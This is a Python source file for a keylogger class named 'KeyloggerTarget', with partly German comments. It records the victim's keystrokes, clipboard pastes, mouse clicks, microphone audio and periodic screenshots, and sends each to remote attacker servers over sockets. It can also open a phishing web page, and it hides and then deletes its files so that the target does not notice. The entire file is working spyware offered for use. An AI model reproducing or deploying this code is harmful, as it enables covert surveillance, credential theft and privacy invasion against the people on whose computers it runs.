import pyperclip
from pynput import keyboard
from pynput.mouse import Listener
import time
import sys
import socket
import pyautogui as pg
import os
import pyaudio
import threading
import random
import requests
import webbrowser


class KeyloggerTarget:
    def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                 port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,
                 port_of_timer, duration_in_seconds=200, phishing_web=None):
        # "duration_in_seconds" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds
        assert duration_in_seconds >= 60, f"{duration_in_seconds} is not greater and not equal to 60"
        # "duration_in_seconds" should always be bigger than 60 seconds

        self.ip_photos = ip_of_server_photos
        self.port_photos = port_of_server_photos
        self.ip_keylogger = ip_of_server_keylogger_data
        self.port_keylogger = port_of_server_keylogger_data
        self.ip_listener = ip_of_server_listener
        self.port_listener = port_of_server_listener
        self.duration = duration_in_seconds
        self.ip_timer = ip_of_timer
        self.port_timer = port_of_timer
        self.phishing = phishing_web

        self.check = []
        self.caps = False
        self.richtige_liste = []
        self.coordinates = []
        self.word = None

    def daten_aufnehemen(self):
        listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listening_data.connect((self.ip_listener, self.port_listener))
        try:
            format = pyaudio.paInt16
            channels = 2
            rate = 44100
            chunk = 1024
            seconds = self.duration + 1

            audio = pyaudio.PyAudio()

            # start Recording
            stream = audio.open(format=format, channels=channels,
                                rate=rate, input=True,
                                frames_per_buffer=chunk)
            # print("recording...")
            frames = []

            for i in range(0, int(rate / chunk * seconds)):
                data = stream.read(chunk)
                frames.append(data)

            # print("finished recording")

            # stop Recording
            stream.stop_stream()
            stream.close()
            audio.terminate()

            # Connection with ServerListener

            str_frames = str(frames)
            listening_data.send(str_frames.encode())

        except OSError:
            print("NO MICROPHONE DETECTED OR MICROPHONE SETTING DISABLED")
            no_microfon = "THE TARGET HAS NO MICROPHONE ON"
            listening_data.send(no_microfon.encode())
            # Sends data to ServerListener

    def all_dir(self):
        global random_lst
        zeichen = "qwertzuiopasdfghjklyxcvbnm1234567890"
        random_lst = ["".join(random.sample(zeichen, random.randint(4, 10))) for x in range(100)]
        # This makes a list of every directory name randomly
        for dir_name in random_lst:
            os.system(f"mkdir {dir_name}")
            # The directory is being made here

        random_dir = random.choice(random_lst)
        os.chdir(random_dir)
        # We are now in that directory where the image can be stored

    def client(self, ip_photos, port_photos):
        global fhandle
        # fhandle is the variable which opens the foto
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_photos, port_photos))
        # This connects to the server you specified
        image = pg.screenshot()
        # "image" screenshots the current image after a specific time
        fotoname = "Image.png"
        # Name of the image
        image.save(fotoname)
        # Saves the image in the current directory
        fhandle = open(fotoname, "rb")
        # Opens the image

        full_msg = b""
        # Every image information will be stored in "full_msg"
        for line in fhandle:
            full_msg += line

        s.send(full_msg)

    def countdown_send(self, zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
        seconds_list = [zahl for zahl in range(0, zeit + 1, 20) if zahl != 0]
        # The seconds the image will be sent in 20 steps to the server will be saved in "seconds_list"
        print(seconds_list)
        key_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            for x in range(zeit + 1):
                if x == 20:
                    self.all_dir()
                    # This function makes 100 files to store the image so the target won't find out
                print(x)
                zeit -= 1
                time.sleep(1)
                if x in seconds_list:
                    self.client(ip_photos, port_photos)
                    # The images will be sent
            key_data.connect((ip_keylogger, port_keylogger))
            # This is the ip and the port of the server the port shouldn't be the same the server_photos and the server_keylogger shouldn't be
            # in the same folder
            self.coordinates = list(set(self.coordinates))
            # This checks if the coordinates occur 2 times
            print(self.coordinates)
            wort = ""
            for zeichen in self.richtige_liste:
                wort += zeichen

            # Sends the data to server_keylogger
            all_data = str(self.coordinates) + wort
            # Coordinates and keydata are being concatenated
            key_data.send(all_data.encode())
            print(wort)
            print(self.richtige_liste)
            fhandle.close()
            # Closes the image
            os.remove("Image.png")
            # Deletes the image in the current directory
            os.chdir("..")
            # We have to go back so that we can delete the other directories
            for each_dir in random_lst:
                os.system(f"rmdir {each_dir}")
                # This deletes every directory
            sys.exit()
            # Stops the keylogger
        except KeyboardInterrupt:
            # If the target has destroyed the connection
            wort = "***%§§)§§%"
            # This is like a special code. To split it at the end
            for zeichen in self.richtige_liste:
                wort += zeichen
            data = f"THE CONNECTION HAS BEEN INTERRUPTED{wort}"
            # This let's the server know that the server should shut down
            key_data.connect((ip_keylogger, port_keylogger))
            key_data.send(data.encode())
            key_data.close()

            if os.path.exists("Image.png"):
                # It will destroy the image so target wound know anything
                fhandle.close()
                os.remove("Image.png")
            # This removes the image

    def kill_switch(self):
        # This function destroys the mouse info
        new_seconds = self.duration + 5
        # 20 seconds are being added because there might be a problem
        for x in range(new_seconds):
            time.sleep(1)
        # This stopes the
        sys.exit()

    def on_click(self, x, y, button, pressed):
        # This is the click function
        print(f"Target has pressed {x} and {y}")
        # All the coordinates will be stored in "self.coordinates"
        self.coordinates.append((x, y))

    def all_clicks(self):
        # This is just a function so it can be ran with threading
        with Listener(on_click=self.on_click) as listening:
            self.kill_switch()
            listening.join()
    
    def copy_data(self):
        self.richtige_liste.append(" (COPY (Strg+c)) ")

    def append_paste(self):
        data = f" ({pyperclip.paste()} | PASTE (Strg+v)) | "
        self.richtige_liste.append(data)

    def print_work(self, word):
        print(f'Alphabetic key was pressed: {word} ')
        self.richtige_liste += word
        # Every pressed key will be saved in "richtige_liste" this is a german self.word and means "right_list"

    def on_press(self, key):
        try:
            try:
                other_charecters = {"1": "!", "2": '"', "3": "§", "4": "$", "5": "%", "6": "&", "7": "/", "8": "(",
                                    "9": ")", "0": "=", "ß": "?"}
                if self.caps is True:
                    if key.char in other_charecters:
                        self.word = other_charecters[key.char]
                        # Upper Characters from "1" to "0" because all this numbers are not charecters are not in pynput
                    else:
                        self.word = key.char.upper()
                else:
                    self.word = key.char

                all_req_keys = {"": self.copy_data, "": self.append_paste}
                # "ETX" stands for "End-Text-character" and is a control character which knows the character of copying something on the keyboard
                # "SYN" stands for "Synchronous Idle" and is a control character which knows the character of pasting something on the keyboard
                for each_key in all_req_keys:
                    if each_key == key.char:
                        # If the copy character is pressed, each function of each character will be working
                        all_req_keys[each_key]()
                try:
                    asci_number = ord(self.word)
                    # Ordinal number in the range of 0 to 31 completes all special characters with the key "strg + letter"
                    if asci_number not in range(0, 32):
                        # if there is no special character it just prints the alphabetic number
                        self.print_work(self.word)

                except TypeError:
                    # prints the alphabetc number
                    self.print_work(self.word)

                print(self.richtige_liste)
            except TypeError:
                pass

        except AttributeError:
            print(f'An other key was pressed: {key}')
            if key == keyboard.Key.space or key == keyboard.Key.tab:
                self.richtige_liste += "{"
                # If the target presses tab or space a "{" will be appended to the list so the attacker knows when and
                # space or a tab key has been pressed
            elif key == keyboard.Key.caps_lock:
                self.caps = True
                self.check.append(1)
            check_caps = sum(self.check) / 2
            # If check_caps is not primary it will set self.caps to False

            if str(check_caps)[-1] != '0':
                pass
            else:
                self.caps = False

    def on_release(self, key):
        print(f'Key released: {key}')

    def start(self):
        if self.phishing is not None:
            while True:
                try:
                    response = requests.get(self.phishing)
                    #Respone is here to see if the website is online or not
                    webbrowser.open(self.phishing)
                    break

                except requests.exceptions.ConnectionError:
                    print("No connection")
                    sys.exit()

        listening_thread = threading.Thread(target=self.daten_aufnehemen)
        # This runs the programm behind the actual programming
        listening_thread.start()

        threading_mouse = threading.Thread(target=self.all_clicks)
        # This runs the programm behind the actual programming
        threading_mouse.start()

        send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        send_timer.connect((self.ip_timer, self.port_timer))

        send_timer.send(str(self.duration).encode())
        # This sends the seconds to the server
        send_timer.close()

        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger,
                                self.port_keylogger)
            listener.join()
            # This listens to the keys that where typed
